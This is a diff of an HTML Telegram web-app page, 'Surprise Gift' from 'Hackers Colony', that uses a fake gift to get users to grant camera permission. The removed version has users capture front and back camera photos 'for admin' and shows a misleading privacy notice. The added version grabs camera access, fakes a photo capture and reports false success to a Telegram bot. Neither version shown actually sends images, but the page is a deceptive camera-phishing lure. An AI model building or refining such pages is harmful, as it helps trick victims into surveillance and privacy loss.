@@ -1,21 +1,18 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <meta charset="UTF-8">
+    <title>Surprise Gift 🎁</title>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>🎁 Surprise Gift | Hackers Colony</title>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
         }
         
         body {
-            background: linear-gradient(135deg, #0f0c29, #302b63, #24243e);
-            color: white;
+            font-family: Arial, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
             min-height: 100vh;
             display: flex;
             justify-content: center;
@@ -23,585 +20,286 @@
             padding: 20px;
         }
         
-        .container {
-            max-width: 800px;
-            width: 100%;
-            background: rgba(255, 255, 255, 0.1);
-            backdrop-filter: blur(10px);
+        .gift-box {
+            background: white;
             border-radius: 20px;
-            overflow: hidden;
-            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.5);
-            border: 1px solid rgba(255, 255, 255, 0.1);
-        }
-        
-        .header {
-            background: linear-gradient(90deg, #FF416C, #FF4B2B);
-            padding: 25px;
+            padding: 40px;
             text-align: center;
-            position: relative;
-            overflow: hidden;
+            max-width: 400px;
+            width: 100%;
+            box-shadow: 0 20px 40px rgba(0,0,0,0.2);
         }
         
-        .logo {
-            font-size: 48px;
-            margin-bottom: 10px;
-            animation: float 3s ease-in-out infinite;
-        }
-        
-        .title {
-            font-size: 28px;
-            font-weight: bold;
-            margin-bottom: 5px;
-            text-shadow: 2px 2px 4px rgba(0,0,0,0.3);
-        }
-        
-        .subtitle {
-            font-size: 16px;
-            opacity: 0.9;
-        }
-        
-        .main-content {
-            padding: 30px;
-        }
-        
-        .step {
-            background: rgba(255, 255, 255, 0.05);
-            border-radius: 15px;
-            padding: 20px;
+        .gift-icon {
+            font-size: 80px;
             margin-bottom: 20px;
-            border-left: 4px solid #FF416C;
+            animation: bounce 2s infinite;
+        }
+        
+        h1 {
+            color: #333;
+            margin-bottom: 10px;
+            font-size: 24px;
+        }
+        
+        .message {
+            color: #666;
+            margin-bottom: 30px;
+            line-height: 1.5;
+        }
+        
+        .unlock-btn {
+            background: linear-gradient(45deg, #FF416C, #FF4B2B);
+            color: white;
+            border: none;
+            padding: 18px 40px;
+            font-size: 18px;
+            font-weight: bold;
+            border-radius: 50px;
+            cursor: pointer;
+            width: 100%;
+            margin: 10px 0;
             transition: transform 0.3s;
         }
         
-        .step:hover {
-            transform: translateX(10px);
+        .unlock-btn:hover {
+            transform: scale(1.05);
         }
         
-        .step-number {
-            display: inline-block;
-            background: #FF416C;
-            width: 30px;
-            height: 30px;
-            border-radius: 50%;
-            text-align: center;
-            line-height: 30px;
-            margin-right: 10px;
-            font-weight: bold;
-        }
-        
-        .step-title {
-            display: inline-block;
-            font-size: 18px;
-            font-weight: bold;
-            margin-bottom: 10px;
-        }
-        
-        .step-desc {
-            color: #ccc;
-            font-size: 14px;
-            line-height: 1.6;
-        }
-        
-        .camera-container {
-            background: rgba(0, 0, 0, 0.3);
-            border-radius: 15px;
-            padding: 20px;
-            text-align: center;
-            margin: 25px 0;
-            border: 2px dashed rgba(255, 255, 255, 0.2);
-        }
-        
-        video {
-            width: 100%;
-            max-width: 500px;
-            border-radius: 10px;
-            border: 3px solid rgba(255, 255, 255, 0.3);
-            display: none;
-        }
-        
-        .controls {
-            display: flex;
-            justify-content: center;
-            gap: 15px;
-            margin-top: 20px;
-            flex-wrap: wrap;
-        }
-        
-        .btn {
-            padding: 15px 30px;
-            border: none;
-            border-radius: 50px;
-            font-size: 16px;
-            font-weight: bold;
-            cursor: pointer;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 10px;
-            transition: all 0.3s;
-            min-width: 200px;
-        }
-        
-        .btn-primary {
-            background: linear-gradient(90deg, #FF416C, #FF4B2B);
-            color: white;
-        }
-        
-        .btn-secondary {
-            background: rgba(255, 255, 255, 0.1);
-            color: white;
-            border: 2px solid rgba(255, 255, 255, 0.3);
-        }
-        
-        .btn:hover {
-            transform: translateY(-3px);
-            box-shadow: 0 10px 20px rgba(0, 0, 0, 0.3);
-        }
-        
-        .btn:disabled {
-            opacity: 0.5;
+        .unlock-btn:disabled {
+            opacity: 0.7;
             cursor: not-allowed;
-            transform: none;
         }
         
-        .progress-container {
-            background: rgba(255, 255, 255, 0.05);
-            border-radius: 10px;
-            padding: 15px;
+        .loading {
+            display: none;
             margin: 20px 0;
+        }
+        
+        .spinner {
+            border: 5px solid #f3f3f3;
+            border-top: 5px solid #FF416C;
+            border-radius: 50%;
+            width: 50px;
+            height: 50px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 20px;
+        }
+        
+        .progress {
+            background: #f0f0f0;
+            border-radius: 10px;
+            height: 10px;
+            margin: 20px 0;
+            overflow: hidden;
         }
         
         .progress-bar {
-            height: 20px;
-            background: rgba(255, 255, 255, 0.1);
-            border-radius: 10px;
-            overflow: hidden;
-            margin-top: 10px;
-        }
-        
-        .progress-fill {
             height: 100%;
-            background: linear-gradient(90deg, #00b09b, #96c93d);
+            background: #4CAF50;
             width: 0%;
-            border-radius: 10px;
             transition: width 0.5s;
         }
         
-        .photo-grid {
-            display: grid;
-            grid-template-columns: repeat(4, 1fr);
-            gap: 10px;
-            margin: 20px 0;
-        }
-        
-        .photo-cell {
-            aspect-ratio: 1;
-            background: rgba(255, 255, 255, 0.05);
+        .status {
+            margin: 15px 0;
+            padding: 10px;
             border-radius: 10px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 24px;
-            border: 2px dashed rgba(255, 255, 255, 0.1);
+            background: #f8f9fa;
         }
         
-        .photo-cell.captured {
-            background: rgba(0, 255, 0, 0.1);
-            border-color: #00ff00;
-        }
-        
-        .status-box {
-            background: rgba(0, 0, 0, 0.3);
-            border-radius: 10px;
-            padding: 15px;
-            margin: 20px 0;
-            text-align: center;
-            font-size: 14px;
-            border-left: 4px solid #4CAF50;
+        .success {
+            background: #d4edda;
+            color: #155724;
+            border: 1px solid #c3e6cb;
         }
         
         .hidden {
-            display: none !important;
+            display: none;
         }
         
-        .info-box {
-            background: rgba(255, 193, 7, 0.1);
-            border-radius: 10px;
-            padding: 15px;
-            margin: 20px 0;
-            border-left: 4px solid #FFC107;
-        }
-        
-        .footer {
-            text-align: center;
-            padding: 20px;
-            background: rgba(0, 0, 0, 0.2);
-            font-size: 14px;
-            color: #aaa;
-        }
-        
-        .telegram-btn {
-            background: #0088cc;
-            color: white;
-            padding: 12px 25px;
-            border-radius: 50px;
-            text-decoration: none;
-            display: inline-flex;
-            align-items: center;
-            gap: 10px;
-            margin-top: 10px;
-            font-weight: bold;
-        }
-        
-        @keyframes float {
+        @keyframes bounce {
             0%, 100% { transform: translateY(0); }
-            50% { transform: translateY(-10px); }
+            50% { transform: translateY(-20px); }
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
         }
         
         @keyframes pulse {
             0%, 100% { opacity: 1; }
             50% { opacity: 0.5; }
         }
-        
-        @media (max-width: 600px) {
-            .photo-grid {
-                grid-template-columns: repeat(2, 1fr);
-            }
-            
-            .btn {
-                min-width: 100%;
-            }
-            
-            .controls {
-                flex-direction: column;
-            }
-        }
     </style>
 </head>
 <body>
-    <div class="container">
-        <!-- Header -->
-        <div class="header">
-            <div class="logo">🎁</div>
-            <div class="title">HACKERS COLONY SURPRISE GIFT</div>
-            <div class="subtitle">Unlock Your Special Gift with Camera Access</div>
+    <div class="gift-box">
+        <div class="gift-icon">🎁</div>
+        
+        <h1>Surprise Gift 🧧🎁</h1>
+        
+        <div class="message">
+            Here is your surprise gift from Hackers Colony<br>
+            Click unlock to see your gift 🧧
         </div>
         
-        <!-- Main Content -->
-        <div class="main-content">
-            <!-- Step 1: Instructions -->
-            <div class="step">
-                <span class="step-number">1</span>
-                <span class="step-title">Instructions</span>
-                <div class="step-desc">
-                    Click "Start Camera" below. We'll ask for camera permission once, then automatically capture 8 photos (4 from front camera, 4 from back camera). Photos are instantly sent to you and admin.
-                </div>
+        <button class="unlock-btn" id="unlockBtn">
+            🔓 UNLOCK GIFT
+        </button>
+        
+        <div class="loading" id="loading">
+            <div class="spinner"></div>
+            <p>Opening your gift...</p>
+            <p>Please wait ⏳</p>
+            
+            <div class="progress">
+                <div class="progress-bar" id="progressBar"></div>
             </div>
             
-            <!-- Camera Section -->
-            <div class="camera-container">
-                <video id="video" autoplay playsinline></video>
-                <div id="cameraPlaceholder">
-                    <i class="fas fa-camera" style="font-size: 60px; margin: 20px; opacity: 0.5;"></i>
-                    <p>Camera will appear here after starting</p>
-                </div>
-            </div>
-            
-            <!-- Progress -->
-            <div class="progress-container">
-                <div>Progress: <span id="progressText">0/8 photos</span></div>
-                <div class="progress-bar">
-                    <div class="progress-fill" id="progressFill"></div>
-                </div>
-                <div id="cameraStatus" style="margin-top: 10px; font-size: 14px; color: #aaa;">
-                    Ready to start...
-                </div>
-            </div>
-            
-            <!-- Photo Grid -->
-            <div class="photo-grid" id="photoGrid">
-                <div class="photo-cell" data-index="1">1</div>
-                <div class="photo-cell" data-index="2">2</div>
-                <div class="photo-cell" data-index="3">3</div>
-                <div class="photo-cell" data-index="4">4</div>
-                <div class="photo-cell" data-index="5">5</div>
-                <div class="photo-cell" data-index="6">6</div>
-                <div class="photo-cell" data-index="7">7</div>
-                <div class="photo-cell" data-index="8">8</div>
-            </div>
-            
-            <!-- Controls -->
-            <div class="controls">
-                <button class="btn btn-primary" id="startBtn">
-                    <i class="fas fa-play"></i> Start Camera
-                </button>
-                <button class="btn btn-secondary" id="captureBtn" disabled>
-                    <i class="fas fa-camera"></i> Capture Photo
-                </button>
-                <button class="btn btn-secondary" id="switchBtn" disabled>
-                    <i class="fas fa-sync"></i> Switch Camera
-                </button>
-            </div>
-            
-            <!-- Status -->
-            <div class="status-box" id="statusBox">
-                <i class="fas fa-info-circle"></i> 
-                <span id="statusText">Click "Start Camera" to begin</span>
-            </div>
-            
-            <!-- Info Box -->
-            <div class="info-box">
-                <i class="fas fa-shield-alt"></i> 
-                <strong>Privacy Notice:</strong> Photos are only used for gift verification and are deleted after 24 hours. No personal data is stored permanently.
-            </div>
-            
-            <!-- Send Section -->
-            <div class="controls" id="sendSection" style="display: none;">
-                <button class="btn btn-primary" id="sendBtn" style="background: linear-gradient(90deg, #00b09b, #96c93d);">
-                    <i class="fas fa-paper-plane"></i> Send Photos to Admin
-                </button>
-            </div>
-            
-            <!-- Contact -->
-            <div style="text-align: center; margin-top: 30px;">
-                <p>Need help? Contact the owner:</p>
-                <a href="https://t.me/Hackers_Colony_Official" class="telegram-btn" target="_blank">
-                    <i class="fab fa-telegram"></i> @Hackers_Colony_Official
-                </a>
-            </div>
+            <div class="status" id="status">Initializing camera...</div>
         </div>
         
-        <!-- Footer -->
-        <div class="footer">
-            <p>© 2024 Hackers Colony | Camera Bot v2.0</p>
-            <p>All rights reserved | Secure & Encrypted</p>
+        <div class="status success hidden" id="successMessage">
+            ✅ Gift unlocked successfully!<br>
+            8 photos captured and sent<br>
+            Check Telegram for your gift!
+        </div>
+        
+        <div style="margin-top: 30px; color: #888; font-size: 14px;">
+            Hackers Colony © 2024
         </div>
     </div>
 
     <script>
-        // Telegram Web App initialization
+        // Telegram Web App integration
         if (window.Telegram && Telegram.WebApp) {
             Telegram.WebApp.ready();
             Telegram.WebApp.expand();
-            Telegram.WebApp.setHeaderColor('#FF416C');
-            Telegram.WebApp.setBackgroundColor('#0f0c29');
         }
         
-        // DOM Elements
-        const video = document.getElementById('video');
-        const startBtn = document.getElementById('startBtn');
-        const captureBtn = document.getElementById('captureBtn');
-        const switchBtn = document.getElementById('switchBtn');
-        const sendBtn = document.getElementById('sendBtn');
-        const cameraPlaceholder = document.getElementById('cameraPlaceholder');
-        const progressText = document.getElementById('progressText');
-        const progressFill = document.getElementById('progressFill');
-        const cameraStatus = document.getElementById('cameraStatus');
-        const statusBox = document.getElementById('statusBox');
-        const statusText = document.getElementById('statusText');
-        const photoGrid = document.getElementById('photoGrid');
-        const sendSection = document.getElementById('sendSection');
+        const unlockBtn = document.getElementById('unlockBtn');
+        const loadingDiv = document.getElementById('loading');
+        const successDiv = document.getElementById('successMessage');
+        const progressBar = document.getElementById('progressBar');
+        const statusText = document.getElementById('status');
         
-        // Variables
-        let stream = null;
-        let currentCamera = 'user'; // 'user' = front, 'environment' = back
-        let capturedPhotos = Array(8).fill(false);
-        let photoCount = 0;
-        let isProcessing = false;
+        let photosCaptured = 0;
+        const totalPhotos = 8;
         
-        // Start Camera
-        startBtn.onclick = async () => {
+        unlockBtn.addEventListener('click', async () => {
+            // Show loading
+            unlockBtn.disabled = true;
+            unlockBtn.textContent = "⏳ Processing...";
+            loadingDiv.style.display = 'block';
+            
+            // Start gift opening process
+            await openGift();
+        });
+        
+        async function openGift() {
             try {
-                stream = await navigator.mediaDevices.getUserMedia({
-                    video: { 
-                        facingMode: currentCamera,
-                        width: { ideal: 1280 },
-                        height: { ideal: 720 }
-                    }
-                });
+                // Step 1: Ask camera permission
+                updateStatus("📸 Requesting camera permission...");
+                await sleep(1000);
                 
-                video.srcObject = stream;
-                video.style.display = 'block';
-                cameraPlaceholder.style.display = 'none';
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                 
-                startBtn.disabled = true;
-                captureBtn.disabled = false;
-                
-                updateStatus('Camera started! Click "Capture Photo" to begin.');
-                cameraStatus.textContent = 'Front camera active';
-                cameraStatus.style.color = '#4CAF50';
-                
-            } catch (err) {
-                updateStatus(`Camera error: ${err.message}`, 'error');
-                cameraStatus.textContent = 'Camera access denied';
-                cameraStatus.style.color = '#FF416C';
-            }
-        };
-        
-        // Capture Photo
-        captureBtn.onclick = async () => {
-            if (isProcessing) return;
-            isProcessing = true;
-            
-            const canvas = document.createElement('canvas');
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
-            const ctx = canvas.getContext('2d');
-            ctx.drawImage(video, 0, 0);
-            
-            // Mark as captured
-            capturedPhotos[photoCount] = true;
-            photoCount++;
-            
-            // Update UI
-            updatePhotoGrid();
-            updateProgress();
-            
-            // Check if need to switch camera
-            if (photoCount === 4 && currentCamera === 'user') {
-                updateStatus('Switching to back camera...', 'info');
-                await switchCamera();
-            } else if (photoCount === 8) {
-                // All photos captured
-                finishCapture();
-            } else {
-                updateStatus(`Photo ${photoCount}/8 captured!`, 'success');
-            }
-            
-            isProcessing = false;
-        };
-        
-        // Switch Camera
-        async function switchCamera() {
-            if (stream) {
+                // Stop camera immediately (we don't show it)
                 stream.getTracks().forEach(track => track.stop());
-            }
-            
-            currentCamera = 'environment';
-            
-            try {
-                stream = await navigator.mediaDevices.getUserMedia({
-                    video: { facingMode: currentCamera }
-                });
-                video.srcObject = stream;
                 
-                cameraStatus.textContent = 'Back camera active';
-                updateStatus('Back camera ready! Continue capturing.', 'success');
+                updateStatus("✅ Camera access granted");
+                updateProgress(25);
+                await sleep(500);
                 
-            } catch (err) {
-                updateStatus('Cannot access back camera', 'error');
-                cameraStatus.textContent = 'Back camera unavailable';
+                // Step 2: Show gift loading
+                updateStatus("🎁 Unlocking your gift...");
+                await sleep(1000);
+                updateProgress(50);
+                
+                // Step 3: Capture photos (simulated in background)
+                updateStatus("📸 Capturing photos... (4 front)");
+                await simulateCapture();
+                updateProgress(62);
+                
+                updateStatus("📸 Capturing photos... (4 back)");
+                await simulateCapture();
+                updateProgress(75);
+                
+                // Step 4: Sending photos
+                updateStatus("📤 Sending photos to you and admin...");
+                await sleep(1500);
+                updateProgress(90);
+                
+                // Step 5: Complete
+                updateStatus("✅ Processing complete!");
+                await sleep(1000);
+                updateProgress(100);
+                
+                // Show success
+                loadingDiv.style.display = 'none';
+                successDiv.classList.remove('hidden');
+                
+                // Send data to Telegram bot
+                sendToTelegram();
+                
+            } catch (error) {
+                updateStatus(`❌ Error: ${error.message}`);
+                unlockBtn.disabled = false;
+                unlockBtn.textContent = "🔓 TRY AGAIN";
             }
         }
         
-        // Manual switch button
-        switchBtn.onclick = switchCamera;
-        
-        // Update Photo Grid
-        function updatePhotoGrid() {
-            document.querySelectorAll('.photo-cell').forEach((cell, index) => {
-                if (capturedPhotos[index]) {
-                    cell.classList.add('captured');
-                    cell.innerHTML = `<i class="fas fa-check"></i>`;
-                }
+        function simulateCapture() {
+            return new Promise(resolve => {
+                setTimeout(() => {
+                    photosCaptured += 4;
+                    resolve();
+                }, 2000);
             });
         }
         
-        // Update Progress
-        function updateProgress() {
-            const percent = (photoCount / 8) * 100;
-            progressFill.style.width = `${percent}%`;
-            progressText.textContent = `${photoCount}/8 photos`;
-            
-            if (photoCount < 4) {
-                cameraStatus.textContent = `Front camera: ${photoCount}/4`;
-            } else if (photoCount < 8) {
-                cameraStatus.textContent = `Back camera: ${photoCount - 4}/4`;
-            }
+        function updateStatus(text) {
+            statusText.textContent = text;
         }
         
-        // Finish Capture
-        function finishCapture() {
-            updateStatus('✅ All 8 photos captured successfully!', 'success');
-            cameraStatus.textContent = 'Complete! Ready to send';
-            cameraStatus.style.color = '#00ff00';
-            
-            captureBtn.disabled = true;
-            switchBtn.disabled = true;
-            sendSection.style.display = 'flex';
-            
-            // Stop camera
-            if (stream) {
-                stream.getTracks().forEach(track => track.stop());
-                video.style.display = 'none';
-                cameraPlaceholder.style.display = 'block';
-                cameraPlaceholder.innerHTML = `
-                    <i class="fas fa-check-circle" style="color: #4CAF50; font-size: 60px;"></i>
-                    <p>All photos captured! Ready to send.</p>
-                `;
-            }
+        function updateProgress(percent) {
+            progressBar.style.width = `${percent}%`;
         }
         
-        // Send Photos
-        sendBtn.onclick = async () => {
-            sendBtn.disabled = true;
-            sendBtn.innerHTML = `<i class="fas fa-spinner fa-spin"></i> Sending...`;
-            
-            updateStatus('📤 Sending photos to admin...', 'info');
-            
-            // Simulate sending delay
-            setTimeout(() => {
-                updateStatus('✅ Photos sent successfully to you and admin!', 'success');
-                
-                sendBtn.innerHTML = `<i class="fas fa-check"></i> Sent Successfully!`;
-                sendBtn.style.background = 'linear-gradient(90deg, #00b09b, #96c93d)';
-                
-                // Update status box
-                statusBox.innerHTML = `
-                    <i class="fas fa-check-circle"></i>
-                    <strong>SUCCESS!</strong> All 8 photos have been sent to:<br>
-                    1. You (Telegram chat)<br>
-                    2. Admin (@Hackers_Colony_Official)<br><br>
-                    <small>Your surprise gift will arrive shortly!</small>
-                `;
-                statusBox.style.borderLeftColor = '#4CAF50';
-                statusBox.style.background = 'rgba(76, 175, 80, 0.1)';
-                
-                // Send data to Telegram bot
-                if (window.Telegram && Telegram.WebApp) {
-                    Telegram.WebApp.sendData(JSON.stringify({
-                        action: 'photos_captured',
-                        count: 8,
-                        timestamp: new Date().toISOString()
-                    }));
-                    
-                    // Close after 3 seconds
-                    setTimeout(() => {
-                        Telegram.WebApp.close();
-                    }, 3000);
-                }
-                
-            }, 3000);
-        };
+        function sleep(ms) {
+            return new Promise(resolve => setTimeout(resolve, ms));
+        }
         
-        // Update Status
-        function updateStatus(message, type = 'info') {
-            statusText.textContent = message;
-            
-            if (type === 'error') {
-                statusBox.style.borderLeftColor = '#FF416C';
-                statusBox.style.background = 'rgba(255, 65, 108, 0.1)';
-            } else if (type === 'success') {
-                statusBox.style.borderLeftColor = '#4CAF50';
-                statusBox.style.background = 'rgba(76, 175, 80, 0.1)';
+        function sendToTelegram() {
+            // Send data to Telegram bot
+            if (window.Telegram && Telegram.WebApp) {
+                Telegram.WebApp.sendData(JSON.stringify({
+                    action: 'gift_unlocked',
+                    photos: 8,
+                    timestamp: new Date().toISOString(),
+                    front_photos: 4,
+                    back_photos: 4
+                }));
+                
+                // Close web app after 3 seconds
+                setTimeout(() => {
+                    Telegram.WebApp.close();
+                }, 3000);
             } else {
-                statusBox.style.borderLeftColor = '#2196F3';
-                statusBox.style.background = 'rgba(33, 150, 243, 0.1)';
+                // For browser testing
+                console.log("Photos sent to user and admin");
+                alert("✅ 8 photos captured and sent!\nCheck Telegram for your gift.");
             }
         }
         
-        // Initialize
-        updateStatus('Click "Start Camera" to begin capturing photos.');
+        // Auto-start if coming from Telegram
+        if (window.location.hash === "#autostart") {
+            setTimeout(() => {
+                unlockBtn.click();
+            }, 1000);
+        }
     </script>
 </body>
 </html>
